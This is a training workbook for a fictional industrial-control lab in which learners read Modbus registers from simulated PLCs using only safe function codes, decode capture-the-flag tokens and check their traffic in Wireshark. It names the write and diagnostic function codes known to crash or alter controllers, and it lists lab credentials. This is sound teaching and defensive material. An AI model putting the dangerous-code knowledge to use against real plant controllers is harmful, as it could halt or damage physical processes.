docs.text:
Client Masa Foods, Inc. (fictional) Role OT Security Engineer, Plant 1 Phase Discovery Enumeration Exploitation Reporting

What you know so far: You have crossed the enterprise-to-OT boundary (Exercise 2.1) and audited a contractor's after-hours activity (Exercise 2.2). You have never issued a dangerous Modbus function code against a Plant 1 PLC. Exercise 2.3 makes that discipline explicit: learn the safe function codes, use them deliberately, and leave the PLCs in exactly the state you found them.

docs.title: Environment Checklist
docs.text:
Every ICSPT exercise assumes you read the Before-You-Begin section in Exercise 1.1 (Touring Masa Foods) first. If you have not, open that page now: it explains the two attacker-host options and walks you through the one-time /etc/hosts setup that lets you call every Plant 1 target by its friendly name.

Exercise 2.3 reaches plc1.masa.local, mixer.masa.local, and docs.masa.local. All three names are already in your /etc/hosts from the Exercise 1.1 block. Confirm resolution and reachability:

Kali

getent hosts plc1.masa.local mixer.masa.local docs.masa.local
nc -zv plc1.masa.local 502
nc -zv mixer.masa.local 502
curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://docs.masa.local/

Expected: three name-to-IP lines, two succeeded! TCP probes, and HTTP 200 from the docs portal. If any step fails, fix connectivity before continuing.

docs.title: Scenario
docs.text: Reyna Alvarado has booked a one-hour read-only assessment window on the Plant 1 tortilla line. During the window, she wants proof that you can interrogate both the MC-7200 tortilla PLC and the MC-3100 mixer PLC without issuing any dangerous Modbus function code. Reyna is sensitive because the mixer is known to crash on malformed packets, and she wants the new OT security engineer to demonstrate safe technique in front of operations.

docs.title: Why this matters
docs.text:
Real OT engagements are contractually bounded by scope. Most of them say "read-only" in the statement of work, and some of them say it more than once, in bold, with the client's legal team copied. The reasons are not theoretical:

  • Insurance carriers. Cyber-insurance policies for manufacturing plants commonly require that any third-party testing be certified read-only. An engineer who issues a write during a read-only engagement violates the policy, and the carrier may decline to pay on any incident that occurs during the test window regardless of whether the engineer's write was the cause. One careless function code can cost seven figures.
  • Regulatory scope. NERC CIP and similar regimes require change control on any action that modifies a Critical Cyber Asset. A pen tester who writes to a register without a change ticket creates a regulatory incident for the client, even if nothing bad happens operationally.
  • Reputation and repeat business. The first engagement with a new OT client is always on probation. If the shift supervisor sees a single tag jitter that cannot be explained, the pen test firm does not get called back. Clean read-only discipline is how you earn the second engagement, and the second engagement is where the real work happens.

Knowing which function codes are safe is not an academic classification. It is the line between a professional who gets hired again and one who gets a legal letter. Exercise 2.3 forces you to internalize the function-code table by using it under conditions that match a real engagement: an operator watching, a fragile PLC on the other end, and zero tolerance for an errant write.

In this exercise you learn the distinction between safe Modbus function codes (reads, diagnostic queries, device identification) and dangerous function codes (writes, diagnostic resets, mask writes). You read the mixer serial string from the MC-3100, read the plc1 commissioning certificate from the MC-7200, and compose a composite flag that proves both reads succeeded. Every read is one mbpoll Function Code 3 query, and you decode the ASCII by hand.

Credentials in scope Username Password Where it is used Operator HMI plant_op masa_op_2025 Reference only; not used here

The flag is a composite that proves you read two specific fields without writing anything: the mixer PLC serial string and the plc1 commissioning certificate. The format is:

OCR{<serial>_<cert>}

where <serial> is the mixer serial lowercased with hyphens removed, and <cert> is the decoded commissioning certificate text with the OCR{ and } wrapper stripped off. You read and decode each piece yourself; neither component is printed in this workbook.

docs.title: Objectives
docs.text:
• List the Modbus function codes that are safe and the ones that are dangerous
  • Read the mixer PLC serial from holding registers 40110 through 40117 with one mbpoll command
  • Read the plc1 commissioning certificate at holding registers 40500 through 40515 with one mbpoll command
  • Decode each register block to ASCII by hand and compose the composite flag
Detail Value Difficulty Beginner Estimated Time 40 to 60 minutes Prerequisites Exercises 3.1 and 2.2 Flag Source Found? OCR{<serial>_<cert>} Composite of two register-block reads

docs.title: Background: Safe vs Dangerous Modbus Function Codes
docs.text: The Modbus specification defines about 20 function codes. In an OT engagement, you must know by heart which ones are safe to issue against a production PLC and which ones are not. The consequences of guessing wrong range from "the PLC ignores your packet" to "the PLC reboots and stops a live process." Older PLCs (pre-2010 firmware) are especially fragile; newer PLCs tolerate more but still expose process state to any write.

docs.title: Safe function codes
docs.text:
The "safe" list is the read family plus diagnostic queries that do not modify PLC state.

FC Name What it does 1 Read Coils Returns N bits of coil state 2 Read Discrete Inputs Returns N bits of discrete input state 3 Read Holding Registers Returns N 16-bit holding register values 4 Read Input Registers Returns N 16-bit input register values 7 Read Exception Status Returns 8 bits of exception state 11 Get Comm Event Counter Returns a 16-bit communication event counter 12 Get Comm Event Log Returns a communication event log 17 Report Server ID Returns a vendor-specific server identification 20 Read File Record Returns N records from a file 24 Read FIFO Queue Returns the contents of a FIFO queue 43 Encapsulated Interface Transport (subfunction 14) Returns device identification (vendor, product, version)

All of these are reads. None of them cause state changes on the PLC. FC 7, 11, 12, 17, 20, and 24 are historical and less common on modern PLCs but are still safe on the wire.

docs.title: Dangerous function codes
docs.text:
Anything that modifies PLC state, resets counters, or exercises the diagnostic subsystem is dangerous. Treat this list as off-limits for reconnaissance:

FC Name What it does 5 Write Single Coil Sets one coil to ON or OFF 6 Write Single Register Sets one holding register to a new value 8 Diagnostics Multiple subfunctions including Restart Communications Option (reboots the PLC) 15 Write Multiple Coils Sets a contiguous block of coils 16 Write Multiple Registers Sets a contiguous block of holding registers 21 Write File Record Modifies file records 22 Mask Write Register Applies an AND/OR mask to a holding register 23 Read/Write Multiple Registers Reads a block and writes a different block in one transaction

FC 8 deserves a special mention. The diagnostic subfunction numbers include Restart Communications Option (subfunction 1), Clear Counters (subfunction 10), and Clear Overrun (subfunction 20). Every one of them mutates PLC state and several have been used in the field to crash controllers.

The mixer crashes on function codes it does not recognize

The MC-3100 Mixer Controller running on the Masa Plant 1 dough line is a 2012-era PLC. Reyna's note "reboots if you look at it funny" is not an exaggeration. Stick to FC 3 (Read Holding Registers) on the mixer for this entire exercise. FC 43 would also be safe in theory, but the MC-3100 does not implement it cleanly, so convention at Masa is "mixer is FC 3 only."

docs.title: Tools You Will Need
docs.text: Tool Purpose Check mbpoll Modbus/TCP command-line client: read holding registers with no code which mbpoll Wireshark / tshark Capture the query on TCP/502 and confirm the function code is a safe read wireshark --version curl Fetch the docs portal register map for reference curl --version

docs.title: Methodology
docs.text: You build the answer with tools, not scripts. Checkpoint 1 rereads the register map so you know where the safe read targets live. Checkpoint 2 reads the mixer serial with one mbpoll command and decodes it by hand. Checkpoint 3 reads the plc1 certificate the same way. Checkpoint 4 captures one of the reads in Wireshark and confirms on the wire that you issued only Function Code 3. Checkpoint 5 records the decoded tokens and composes the flag.

docs.title: Checkpoint 1: Read the Register Map From the Docs Portal
docs.text:
Before any Modbus command, reread the plc1 register map from the engineering docs portal. Skim the map to remind yourself where the safe read targets live. On a real plant the move is identical, which is to read the vendor's register map before you touch the PLC.

Kali

curl -s http://docs.masa.local/register-map.html | grep -E '4010|4050|40100|40500|40800|40980' | head -20
Expected output 

<tr><td>40010</td><td>oven_temp_sp</td>...
<tr><td>40020</td><td>mixer_speed_pv</td>...
<tr><td>40040</td><td>batch_count</td>...
<tr><td>40050</td><td>line_state</td>...
<tr><td>40100-40106</td><td>device_ident</td>...
<tr><td>40500-40515</td><td>commission_cert</td>...
<tr><td>40800-40815</td><td>incident_log</td>...
The docs portal lists every important register block on plc1. Every target in this exercise is in the 40100 or 40500 range.

docs.title: Checkpoint 2: Read the Mixer Serial with mbpoll
docs.text:
Where the register numbers come from. The MC-3100 mixer stores its serial number in holding registers 40110 through 40117 as ASCII text, two characters per register. That is eight registers, sixteen characters of capacity. The docs portal publishes the layout; you are not guessing addresses.

The documented register, the wire address, and what mbpoll wants. Holding registers are documented in the 4xxxx range. On the wire the address is zero-based and drops the leading 4, so documented register 40110 is wire address 109. The mbpoll tool hides that arithmetic for you: its -r option takes the register number without the leading 4, so -r 110 reads documented register 40110. Reading the eight-register block 40110 through 40117 is therefore -r 110 -c 8.

Documented register Holds mbpoll -r 40110 through 40117 mixer serial (2 ASCII chars per register, big-endian) 110, count 8

Read the block with one command. There is no client to write. mbpoll is the standard Modbus/TCP CLI, and a single read covers the whole block. Function Code 3 (read holding registers) is the one code the fragile MC-3100 is guaranteed to accept.

Kali

mbpoll -1 -a 1 -t 4 -r 110 -c 8 mixer.masa.local
-1 polls once and exits, -a 1 is the Modbus unit id, -t 4 selects holding registers (Function Code 3), -r 110 starts at documented register 40110, and -c 8 reads the eight-register serial block. Port 502 is the default. mbpoll labels each value with its register number, so you read the layout straight off the output.

The eight values on your screen are the serial, one register at a time, as decimal integers. They are not human-readable yet because each register is two packed ASCII bytes. You convert them to text by hand below.

Decode one register so the method is clear. Each holding register is 16 bits, which is two bytes, which is two ASCII characters with the high byte first (the Modbus big-endian convention). Convert each register's decimal value to hex, then read the two bytes as characters. A register reading 19777 is 0x4D41 in hex: the high byte 0x4D is the ASCII character M, and the low byte 0x41 is A, so that register carries MA. The 0x4D41 -> MA example is deliberately not part of the mixer serial, so you still have to run the read and do the decode yourself.

Apply the same split to every register in your output, in register order, and concatenate the characters. Drop any trailing null padding (0x0000). The remaining characters spell the mixer serial, which is a Maxon part-number string with a hyphen in it. For the flag you need the lowercased version with the hyphen removed; record both forms in the Checkpoint 5 table.

docs.title: Checkpoint 3: Read the plc1 Commissioning Certificate with mbpoll
docs.text:
The commissioning certificate lives at 40500 through 40515 on plc1, packed as sixteen registers of ASCII, two characters per register, big-endian. The wire address for documented register 40500 is 499, and mbpoll's -r option takes the register number without the leading 4, so -r 500 -c 16 reads the whole block.

Documented register Holds mbpoll -r 40500 through 40515 commissioning certificate (2 ASCII chars per register, big-endian) 500, count 16

Kali

mbpoll -1 -a 1 -t 4 -r 500 -c 16 plc1.masa.local
Same options as Checkpoint 2, except the target is plc1.masa.local, -r 500 starts at documented register 40500, and -c 16 reads the sixteen-register certificate block.

Decode the same way. Convert each of the sixteen register values to hex, split into two ASCII bytes high byte first, and concatenate in register order. Drop the trailing null registers. The decoded string is an OCR{...} certificate. For the flag you need the inner token only, which is the certificate with the OCR{ prefix and the } suffix stripped off. Record both the full certificate and the inner token in the Checkpoint 5 table.

docs.title: Checkpoint 4: Confirm on the Wire That You Used Only Safe Function Codes
docs.text:
mbpoll is the fast path; Wireshark is how you prove to Reyna and the operator that every packet you sent was a read. Capture TCP port 502 while you re-run one of the reads, then confirm the dissected function code is 3 (Read Holding Registers) and not a write code like 6 or 16.

Capture the query while you run it. Start a capture on TCP port 502, re-run a Checkpoint 2 or 3 read, then stop the capture and set the display filter to modbus.

Kali (shell one)

sudo tshark -i any -f 'tcp port 502' -w /tmp/modbus_safe.pcap &
echo $! > /tmp/tshark.pid

Kali (shell two)

mbpoll -1 -a 1 -t 4 -r 110 -c 8 mixer.masa.local

Kali (shell one, after the read completes)

sudo pkill -F /tmp/tshark.pid 2>/dev/null || sudo pkill tshark
tshark -r /tmp/modbus_safe.pcap -Y 'modbus' \
  -T fields -e frame.number -e ip.src \
  -e modbus.func_code -e modbus.reference_num -e modbus.word_cnt
The modbus.func_code column reads 3 on the query. A write would read 6, 16, or 5. Seeing only 3 is your wire-level proof of read-only discipline.

Now open the capture in the Wireshark GUI. The terminal fields prove the data is there; the GUI is where you point at the function code and recognize a read on sight. Walk these steps exactly:

  1. Open the capture. From a terminal run wireshark /tmp/modbus_safe.pcap &, or inside Wireshark choose File > Open and pick the file. To capture live instead, double-click your network interface on the Wireshark welcome screen to start, run the mbpoll read, then click the red square Stop button in the toolbar.
  2. Filter to Modbus. In the display filter bar (the wide bar directly under the toolbar), type modbus and press Enter. The packet list narrows to just the query and its response.
  3. Select the query. In the Packet List (top pane), click the row whose Info column reads Query: ... Func: 3: Read Holding Registers. The word Query and Func: 3 together tell you this is a read going to the PLC.
  4. Expand the MBAP header. In the Packet Details (middle pane), click the arrow to the left of Modbus/TCP. The four MBAP fields drop down: Transaction Identifier, Protocol Identifier, Length, and Unit Identifier.
  5. Expand the PDU and read the Function Code. Click the arrow next to the Modbus node just below it. The first field is Function Code: 3 (Read Holding Registers), followed by the Reference Number and Word Count. That 3 is the field that proves you stayed read-only; a 6 or 16 here would be a write.
  6. Tie the field to the bytes. Click the Function Code field name and watch the matching byte highlight in the Packet Bytes pane at the bottom. The single byte 03 is the function code on the wire. That is how you connect a decoded field to its exact position in the frame.

docs.title: Checkpoint 5: Record Your Findings and Compose the Flag
docs.text:
You now hold two decoded tokens: the normalized mixer serial and the inner certificate token. Turn each into the form the flag template OCR{<serial>_<cert>} expects, then submit the result in the OCR platform flag box. The platform tells you immediately whether the composite is correct, so the finished string is not printed here.

Read-only audit:

Target Register block mbpoll command Decoded value Token for flag Mixer 40110-40117 -r 110 -c 8 _____ _____ (lowercase, no hyphen) plc1 40500-40515 -r 500 -c 16 _____ _____ (inner token, no OCR{})

Function code observed in Wireshark: _____ (should read 3, Read Holding Registers)

Flag: OCR{<serial>_<cert>}

Substitute the two tokens you decoded into the template and submit. Do not write the components or the assembled flag anywhere in this workbook; the platform is the only place you confirm the answer.

docs.title: Output Interpretation
docs.text:
• A clean read of the mixer serial tells you that plc1.masa.local and mixer.masa.local are both on the operations VLAN and both accept FC 3 from your Kali
  • The commissioning certificate is stored as plaintext ASCII. That is a training convention; real plants hide serial numbers behind vendor-specific encapsulated device identification responses (FC 43 subfunction 14)
  • The Wireshark function-code column is your engagement evidence. A capture that shows only Func: 3 across every packet is the artifact you hand Reyna to prove read-only discipline, far stronger than a verbal assurance
  • The composite flag format is deliberately fussy: it requires you to normalize the serial (lowercase, no hyphens) and strip the OCR wrapper off the certificate. Real engagements produce reports that require the same kind of careful text handling

docs.title: Analysis Questions
docs.text:
1. Why is FC 8 (Diagnostics) considered dangerous even though the name sounds read-only?

Reveal answer

FC 8 is a family of diagnostic sub-functions. Subfunctions 0, 2, 11, 12, 13, 14, 15, 16, 17, 18, and 19 are queries and are safe; subfunctions 1 (Restart Communications Option), 10 (Clear Counters), and 20 (Clear Overrun) modify PLC state and can cause a PLC to drop its TCP connections or reset its error counters. Treat FC 8 as dangerous by default because distinguishing the sub-functions on the wire is error-prone and real PLCs have silently misimplemented the sub-function mapping for years.

2. The mixer supports FC 43 (Encapsulated Interface Transport) in theory but the convention at Masa is to avoid it. Why?

Reveal answer

FC 43 sub-function 14 (Read Device Identification) is a multi-packet transport. Older MC-3100 firmware versions had a known bug where a mid-sequence disconnect would leave the PLC's socket in a half-open state, and the next incoming connection would get rejected until the PLC was power-cycled. Maxon Controls issued a firmware update in 2016 but Masa never deployed it because the plant has been running the old image for a decade. Convention beats correctness: stick to FC 3.

3. Suppose you wanted to identify the PLC vendor on an unknown Modbus device. What is the first safe command you would try?

Reveal answer

Try FC 3 against register block 40100 first. Most vendors put a device identification block in that range, and FC 3 is universally supported. With mbpoll that is one command, -r 100 -c 7. If nothing is there, try FC 43 sub-function 14, which is the standard encapsulated interface transport for device identification. If both fail, check banner grabs on common ports (502, 102, 2222, 20000) and cross-reference against the plcscan database of known vendor fingerprints.

4. Why does the flag format strip the OCR wrapper off the certificate?

Reveal answer

Because the flag itself is already wrapped in OCR{}. Nesting the wrapper would produce a doubly wrapped string that is unreadable and would fail the OCR platform flag validator. Stripping wrappers when composing composite flags is the normalization discipline that every real engagement report needs when combining artifacts from multiple sources.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation MC-3100 mixer running a 2012 firmware image with known FC 43 bug Medium Schedule a maintenance window and apply the Maxon 2016 firmware update Modbus write function codes accepted from any host on the operations VLAN Critical Deploy a Modbus-aware firewall with write-function-code allowlisting (see Exercise 3.4 Snort rule) Commissioning certificate stored as plaintext ASCII on the PLC Low Accept as a training convention; real plants would store the certificate off-PLC No enforced separation between "read-only" and "read-write" Modbus clients Medium Use Modbus/TCP Security (RFC 8502) where supported, or enforce source-IP allowlisting at the segmentation boundary

docs.title: Key Takeaways
docs.text:
• Safe Modbus function codes are 1, 2, 3, 4, 7, 11, 12, 17, 20, 24, and 43. Dangerous ones are 5, 6, 8, 15, 16, 21, 22, 23
  • One mbpoll -t 4 command reads a whole register block with Function Code 3 and no code to write
  • A Wireshark capture showing only Func: 3 is the wire-level proof of read-only discipline you hand the client
  • Old PLCs crash on unexpected function codes. Never experiment on a production mixer; use an isolated test bench
  • Composite flags force you to normalize tokens (lowercase, strip wrappers, remove punctuation) the same way a real report does

docs.title: Engagement Status
docs.text:
Client Masa Foods, Inc. (fictional) Role OT Security Engineer, Plant 1 Phase Discovery Enumeration (independent) Exploitation Reporting

What you know so far: You learned the safe Modbus function codes in Exercise 2.3 and practiced a clean read-only assessment on the mixer and the tortilla PLC. Exercise 2.4 raises the pressure: operations is watching, the PLC is instrumented to detect any write on the wire, and a single FC 5, 6, 15, 16, 22, or 23 anywhere in your session replaces the flag with a dirty marker.

docs.title: Environment Checklist
docs.text:
Every ICSPT exercise assumes you read the Before-You-Begin section in Exercise 1.1 (Touring Masa Foods) first. If you have not, open that page now: it explains the two attacker-host options and walks you through the one-time /etc/hosts setup that lets you call every Plant 1 target by its friendly name.

Exercise 2.4 reaches plc1.masa.local, historian.masa.local, and hmi.masa.local. All three names are already in your /etc/hosts from the Exercise 1.1 block. Confirm resolution and reachability:

Kali

getent hosts plc1.masa.local historian.masa.local hmi.masa.local
ping -c 2 plc1.masa.local
nc -zv plc1.masa.local 502
curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://historian.masa.local:3000/

Expected: three name-to-IP lines, two successful pings, succeeded! on TCP/502, and HTTP 200 from the historian. If any step fails, fix connectivity before continuing.

Start this exercise from a brand new shell

If you still have shell history from Exercise 3.3 (Overcooked Tortilla) or Exercise 3.4 (Silent Conveyor) in the current terminal, do NOT reuse any write command from those sessions. Those exercises send write function codes (the mbpoll -t 4 ... <value> write form, or a write client), and running any of them against the current plc1 container will trip the clean-mode tracker and replace the Exercise 2.4 token with a dirty marker. Every command in this exercise is a read: mbpoll -t 4 with no trailing value writes nothing. Open a fresh terminal tab and start with a blank history. If in doubt, run history -c after you confirm reachability.

docs.title: Scenario
docs.text: Operations has agreed to a one-hour read-only assessment window on the Plant 1 tortilla line. The shift supervisor will watch you on the operator HMI for the entire window. Reyna Alvarado was clear: if any tag jitters unexpectedly, the supervisor pulls the plug and the assessment is over.

docs.title: Why this matters
docs.text:
The first assessment with a new OT client is always on probation, and the probation is enforced by the shift supervisor, not by Reyna. Reyna wants you there; the supervisor does not care about cybersecurity and has every incentive to pull the plug at the first sign of trouble because if production stops on his shift, he is the one who gets the call from plant leadership. A clean read-only assessment is how you keep the supervisor quiet, and keeping the supervisor quiet is how you get invited back.

Exercise 2.4 trains three things that you cannot learn by reading:

  • The muscle memory of pure-read operation. Your hands have to reach for the read form (mbpoll -t 4 with no trailing value) by reflex, even when you are tired, under time pressure, or half-certain a write would be faster. Muscle memory is the only defense against a three-AM mistake.
  • The discipline of cross-reference. Reading a register in isolation is a data point. Reading a register and confirming it against the live HMI tile is an observation. Observations are what go in a report. The exercise forces you to cross-reference because that is the professional habit you need to build.
  • The self-audit of shell history. A clean engagement ends with a shell history file that contains no write calls. Making that the final check on the exercise is how you learn to self-audit before the supervisor audits you.

Concretely, the MC-7200 has an in-PLC tripwire specifically designed to make this exercise unforgiving. There is no safety net. If your shell history touches a write function code even once, the PLC records the event and the flag reads as DIRTY_WRITES_DETECTED for the rest of the container lifetime. The only recovery is stopping the exercise and restarting it from the OCR platform, which in a real plant maps to "stopping the assessment window and rescheduling with operations," which is the career-damaging outcome this exercise is teaching you to avoid.

The MC-7200 firmware has a simple internal check. The PLC populates holding registers 40800 through 40815 with an assessment token. While the PLC has received no dangerous write function codes from the wire, the token reads as the clean flag. On the first FC 5, FC 6, FC 15, FC 16, FC 22, or FC 23 the PLC receives from any client on the network, the token flips to DIRTY_WRITES_DETECTED and stays that way until the PLC is restarted.

The PLC does not know which client issued the write. If you write, the whole assessment is ruined. If any other client on the lab network writes, the assessment is also ruined, but on your per-user lab network there are no other clients. The only way to trip the flag is your own commands.

Credentials in scope Username Password Where it is used Plant 1 HMI plant_op masa_op_2025 Read-only HMI tile cross-reference

Your job is to produce a clean read-only assessment of the Plant 1 tortilla PLC, cross-reference two register values against the HMI dashboard, read the assessment flag at register 40800, and submit it.

Exercise 2.4 is independent. There is no step-by-step walkthrough below. Use the discipline you built in Exercise 2.3.

docs.title: Objectives
docs.text:
• Interrogate the tortilla PLC using only safe function codes
  • Cross-reference at least two register values against the live HMI dashboard
  • Read the assessment flag block at holding registers 40800 through 40815
  • Confirm the decoded value is the clean flag, not the dirty marker
  • Submit the clean flag
Detail Value Difficulty Intermediate (independent) Estimated Time 30 to 45 minutes Prerequisites Exercises 2.3 and 3.1 Flag Source Found? OCR{...} Clean assessment flag at holding registers 40800 through 40815

docs.title: Background: How the Clean-Mode Tracker Works
docs.text:
The MC-7200 firmware wraps its Modbus slave context in a subclass that overrides setValues. Every time the pymodbus server dispatches a wire-level write to the slave context (function codes 5, 6, 15, 16, 22, or 23), the override sets a module-level CLEAN_MODE["value"] flag to False. The simulation loop reads that flag on every tick and chooses which string to pack into the assessment flag block.

While CLEAN_MODE is True, the block holds the clean assessment token as ASCII, two bytes per register, big-endian (high byte first). After any dangerous write, the block holds DIRTY_WRITES_DETECTED followed by null padding. The flag is always readable (it is still a holding register block and FC 3 still works), but its contents depend entirely on whether any client on the network has ever issued a dangerous function code since the container booted. You read the block and decode it yourself; the workbook does not print the clean token.

Internal process-variable updates from the simulator itself (oven temperature drift, mixer speed feedback, batch counter increment) go directly to the datablock and bypass the slave context, so they do not trip the tracker. Only network writes count.

Why the tracker cannot distinguish clients

Modbus/TCP is stateless at the protocol layer. The PLC sees TCP connections from Kali clients, HMIs, historians, and engineering workstations with no authentication and no client identifier. All of them look the same to the slave context. The tracker's only defense is "any write from anyone marks the PLC dirty," which is exactly the assumption that makes read-only discipline valuable in production.

docs.title: Tools You Will Need
docs.text: Tool Purpose Check mbpoll Modbus/TCP command-line client: read holding registers with no code, only safe Function Code 3 which mbpoll Wireshark / tshark Capture the read on TCP/502 and confirm only Function Code 3 left your host wireshark --version curl, jq Fetch and parse the HMI state JSON for cross-reference curl --version getent Confirm name resolution before starting getent --version

docs.title: Suggested Methodology
docs.text:
Exercise 2.4 is independent, so the stages below are a reminder of the shape of a clean assessment, not a click-by-click script. You build every read with mbpoll, never a write client, and you confirm with Wireshark that only Function Code 3 ever left your host. The clean-mode tracker punishes any FC 5, 6, 15, 16, 22, or 23, so the tool choice is the discipline: mbpoll -t 4 sends Function Code 3 and nothing else.

The documented register, the wire address, and what mbpoll wants. Holding registers are documented in the 4xxxx range. On the wire the address is zero-based and drops the leading 4, so documented register 40800 is wire address 799. The mbpoll tool hides that arithmetic for you: its -r option takes the register number without the leading 4, so -r 800 reads documented register 40800. Reading the sixteen-register assessment block 40800 through 40815 is therefore -r 800 -c 16.

Documented register Holds mbpoll -r 40800 through 40815 assessment token (2 ASCII chars per register, big-endian) 800, count 16

docs.title: Stage 1: Confirm You Are Clean
docs.text:
Read the assessment block first, before touching anything else, with a single read-only mbpoll command. Function Code 3 (-t 4) is the only code that ever touches the wire, so this read cannot trip the tracker.

Kali

mbpoll -1 -a 1 -t 4 -r 800 -c 16 plc1.masa.local
-1 polls once and exits, -a 1 is the Modbus unit id, -t 4 selects holding registers (Function Code 3), -r 800 starts at documented register 40800, and -c 16 reads the sixteen-register assessment block. Port 502 is the default.

mbpoll labels each value with its register number, so you read the layout straight off the output: sixteen decimal integers, one per register from 40800 through 40815. They are not human-readable yet because each register is two packed ASCII bytes; you decode them in Stage 5. Decode the block now to check the marker. If it spells DIRTY_WRITES_DETECTED, the container was pre-dirty (stale session, or a writeable exercise ran before you), so stop the exercise from the OCR platform and relaunch before continuing. If it spells an OCR{...} string, you are clean and may continue.

docs.title: Stage 2: Confirm Only Function Code 3 Left Your Host
docs.text:
mbpoll is the fast path; Wireshark is how you prove to yourself (and to the supervisor) that nothing you ran was a write. Capture TCP port 502 while you run the Stage 1 read, then confirm every packet you originated decodes to Function Code 3.

Kali (shell one)

sudo tshark -i any -f 'tcp port 502' -w /tmp/clean_assessment.pcap &
echo $! > /tmp/tshark.pid

Kali (shell two)

mbpoll -1 -a 1 -t 4 -r 800 -c 16 plc1.masa.local

Kali (shell one, after the read completes)

sudo pkill -F /tmp/tshark.pid 2>/dev/null || sudo pkill tshark
tshark -r /tmp/clean_assessment.pcap -Y 'modbus' \
  -T fields -e frame.number -e ip.src -e modbus.func_code
Every row whose ip.src is your host must read func code 3. Any 5, 6, 15, 16, 22, or 23 from your address means a write left your host and the assessment is compromised.

Now open the capture in the Wireshark GUI. The terminal fields prove the data is there; the GUI is where you learn to recognize a read on sight and audit a session at a glance. Walk these steps exactly:

  1. Open the capture. From a terminal run wireshark /tmp/clean_assessment.pcap &, or inside Wireshark choose File > Open and pick the file. To capture live instead, double-click your network interface on the Wireshark welcome screen to start, run the mbpoll read, then click the red square Stop button in the toolbar.
  2. Filter to Modbus. In the display filter bar (the wide bar directly under the toolbar), type modbus and press Enter. The packet list narrows to just your query and the PLC's response.
  3. Select the query. In the Packet List (top pane), click the row whose Info column reads Query: ... Func: 3: Read Holding Registers. A read-only assessment should show only Func: 3 queries from your host and nothing else.
  4. Expand the Modbus tree. In the Packet Details (middle pane), click the arrow to the left of Modbus/TCP to see the MBAP header, then the arrow next to the Modbus node below it to reveal the Function Code, Reference Number (799, the zero-based wire form of documented register 40800), and Word Count (16).
  5. Tie a field to the bytes. Click the Function Code field name and watch the matching byte highlight in the Packet Bytes pane at the bottom. The single byte 0x03 is the whole reason this read is safe, and seeing it on the wire is how you confirm it.

docs.title: Stage 3: Read the Process Variables
docs.text:
Read a small block of process-variable registers that you can match against the HMI dashboard. Documented register 40001 is -r 1, so the block 40001 through 40055 is -r 1 -c 55.

Kali

mbpoll -1 -a 1 -t 4 -r 1 -c 55 plc1.masa.local
Same options as Stage 1, except -r 1 starts at documented register 40001 and -c 55 reads the process-variable block. The oven PV is at 40001 (in tenths of a degree), the oven setpoint at 40010, mixer PV/SP at 40020/40021, conveyor at 40030, batch count at 40040, and line state at 40050.

Record the values in your engagement log.

docs.title: Stage 4: Cross-Reference the HMI
docs.text:
Open http://hmi.masa.local/ in a browser (HMI IP from the Exercise Network panel, port 80) and read the operator cockpit: the live process values, line state, interlocks, and alarm banner give you the clean baseline before you touch anything.

Capture the same baseline state as JSON from the command line so you have a machine-readable record next to the visual one. The api/state endpoint returns the exact values the cockpit renders, which makes it an explicit cross-check against what you just read in the browser.

Kali

curl -s http://hmi.masa.local/api/state | jq .

Compare the HMI state values against the register reads from Stage 3. Oven setpoint and conveyor speed are the easiest to match exactly; the process variables carry small amounts of drift that show as floating-point values on the HMI and scaled integers in the registers.

docs.title: Stage 5: Decode the Assessment Token by Hand and Record It
docs.text:
The assessment block is sixteen registers of two ASCII bytes each, high byte first, which is the Modbus big-endian convention. Convert each register's decimal value to hex, then read the two bytes as characters.

Walk one register so the method is clear. A register reading 19777 is 0x4D41 in hex. The high byte is 0x4D, which is the ASCII character M. The low byte is 0x41, which is A. So that register carries MA. Apply the same split to every register in your Stage 1 output, in register order, and concatenate the characters. The last few registers of a clean block are null padding (0x0000); drop the trailing nulls. The remaining characters spell the assessment token, OCR{...} wrapper included, and that is your flag.

The worked 0x4D41 -> MA example is deliberately not part of the real token, so you still have to run the Stage 1 read and do the decode yourself. Re-run the Stage 1 mbpoll read one last time before you submit, decode it, and confirm it still spells the clean OCR{...} token rather than DIRTY_WRITES_DETECTED. If the two decodes diverge, something on the network issued a write between your reads and you have lost the exercise. Submit the decoded string in the OCR platform.

Clean assessment log:

Step Read target mbpoll -r -c Function code HMI cross-reference 1 40800-40815 -r 800 -c 16 3 n/a 2 40001-40055 -r 1 -c 55 3 oven_sp, conveyor 3 40800-40815 (confirm) -r 800 -c 16 3 n/a

Decoded assessment token: _________

The flag is the decoded token itself: the registers spell an OCR{...} string directly, so submit it exactly as you decoded it (it begins with OCR{ and ends with }).

Flag: OCR{________________}

docs.title: Output Interpretation
docs.text:
• The first and last reads of the assessment block should decode to the same clean string. If they diverge, something on the network issued a write between your two reads and you have lost the exercise
  • Cross-referencing oven setpoint against the HMI proves the PLC and the HMI agree on state, which is the operational definition of a healthy Plant 1 session
  • A clean block decodes to an OCR{...} token the firmware packs as big-endian ASCII; the dirty block decodes to DIRTY_WRITES_DETECTED padded with nulls. The two are easy to tell apart once you run the hand decode, which is exactly why the decode is the by-hand skill and not a printed answer
  • Your shell history after this exercise should contain only mbpoll -t 4 reads against plc1, the tshark/wireshark capture commands, and a single curl to the HMI. No mbpoll -t 4 ... <value> write form, no write client of any kind. Audit it as a final discipline check

docs.title: Analysis Questions
docs.text:
1. What is the operational value of instrumenting a PLC to track and report dirty-write state?

Reveal answer

A real plant that deploys this pattern gets a cheap, protocol-level tripwire on any unauthorized write. It does not replace a Modbus-aware IDS (the IDS sees the actual source IP, the function code, and the address), but it is a last-line signal that an operator or a supervisor can verify on the HMI without a SIEM. The drawback is that the tracker cannot distinguish authorized writes from unauthorized ones, so it is only useful during explicit read-only assessment windows.

2. Why does the simulator flip the tracker on FC 22 (Mask Write Register) and FC 23 (Read/Write Multiple Registers) even though FC 23 performs a read?

Reveal answer

FC 23 is a combined read-and-write transaction. The write half mutates PLC state just as surely as FC 6 or FC 16, so from a dirty-tracker perspective it is indistinguishable from a pure write. FC 22 applies an AND/OR mask to a holding register, which is also a state mutation. A tracker that ignored FC 22 or FC 23 would miss real writes dressed up in less common function codes.

3. Could you legitimately argue that reading the assessment flag itself counts as a write, since your TCP connection causes state change inside the PLC?

Reveal answer

No. A TCP connection and an FC 3 request change internal PLC counters (connection count, last-seen timestamp, exception counter), but those are not state that Modbus clients can observe via function codes. The clean-mode tracker is specifically about whether any client issued a function code that the Modbus protocol defines as a write. Everything else (connection setup, packet headers, ACKs) is transport-layer and not in scope.

